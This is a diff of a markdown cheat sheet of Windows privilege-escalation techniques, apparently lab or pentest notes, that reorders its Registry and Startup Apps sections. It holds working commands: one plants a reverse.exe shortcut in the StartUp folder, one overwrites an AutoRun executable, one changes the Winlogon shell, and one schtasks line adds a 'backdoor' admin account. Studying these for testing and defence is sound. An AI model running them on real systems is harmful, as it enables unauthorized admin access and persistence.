@@ -256,34 +256,6 @@ Get-ScheduledTask -TaskName "XblGameSaveTask" | Format-List *
 Get-ScheduledTask | ForEach-Object { $_.Actions }
 ```
 
-## ⭐⭐Startup Apps⭐⭐
-```
-1.  Note that the BUILTIN\Users group can write files to the StartUp directory:
-accesschk64.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-
-C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
-  Medium Mandatory Level (Default) [No-Write-Up]
-  RW BUILTIN\Users
-  RW WIN-QBA94KB3IOF\Administrator
-  RW WIN-QBA94KB3IOF\admin
-  RW NT AUTHORITY\SYSTEM
-  RW BUILTIN\Administrators
-  R  Everyone
-
-2.  Run the C:\PrivEsc\CreateShortcut.vbs script
-     Will create a new shortcut to your reverse.exe executable in the StartUp directory:
-C:\Users\user\Desktop>type C:\PrivEsc\CreateShortcut.vbs
-type C:\PrivEsc\CreateShortcut.vbs
-Set oWS = WScript.CreateObject("WScript.Shell")
-sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
-Set oLink = oWS.CreateShortcut(sLinkFile)
-oLink.TargetPath = "C:\PrivEsc\reverse.exe"
-oLink.Save
-
-C:\Users\user\Desktop>cscript C:\PrivEsc\CreateShortcut.vbs
-
-3.   Simulate an admin logon using RDP and the credentials you previously extracted
-```
 
 
 ## ⭐⭐Permissions⭐⭐
@@ -321,41 +293,6 @@ Must try many times - sometimes shell dont work, exploit dont work etc
 2. Run elevated task
 3. schtasks /create /tn "BackdoorTask" /tr "cmd.exe /c net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add" /sc once /st 00:00 
 schtasks /run /tn "BackdoorTask"
-```
-
-
-
-# ⭐⭐ Registry⭐⭐
-
-## 💠AutoRuns💠
-Run
-```
-🔺 Query the registry for AutoRun executables:
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
-    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
-
-🔺 Check if AutoRun Executable is writable
-accesschk64.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
-
-🔺Overwrite exe
-C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
-
-🔺Restart VM
-shutdown /r /t 0
-```
-
-```
-Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "TestProgram" -Value "C:\Users\Quickemu\Downloads\hello.exe"
-```
-
- WinLogon
-```
- Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "cmd.exe"
- Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe"
 ```
 
 ## 💠AlwaysInstallElevated💠
@@ -414,6 +351,71 @@ Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
   | cd Windows; cd System32; ./fodhelper.exe
   `----
 ```
+
+# ⭐⭐ Registry⭐⭐
+
+## 💠AutoRuns💠
+Run
+```
+🔺 Query the registry for AutoRun executables:
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
+    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
+
+🔺 Check if AutoRun Executable is writable
+accesschk64.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+
+🔺Overwrite exe
+C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+
+🔺Restart VM
+shutdown /r /t 0
+```
+
+```
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "TestProgram" -Value "C:\Users\Quickemu\Downloads\hello.exe"
+```
+
+ WinLogon
+```
+ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "cmd.exe"
+ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe"
+```
+
+
+## ⭐⭐Startup Apps⭐⭐
+```
+1.  Note that the BUILTIN\Users group can write files to the StartUp directory:
+accesschk64.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW BUILTIN\Users
+  RW WIN-QBA94KB3IOF\Administrator
+  RW WIN-QBA94KB3IOF\admin
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+  R  Everyone
+
+2.  Run the C:\PrivEsc\CreateShortcut.vbs script
+     Will create a new shortcut to your reverse.exe executable in the StartUp directory:
+C:\Users\user\Desktop>type C:\PrivEsc\CreateShortcut.vbs
+type C:\PrivEsc\CreateShortcut.vbs
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+
+C:\Users\user\Desktop>cscript C:\PrivEsc\CreateShortcut.vbs
+
+3.   Simulate an admin logon using RDP and the credentials you previously extracted
+```
+
+
 
 ### 🔹Insecure GUI Apps🔹
 
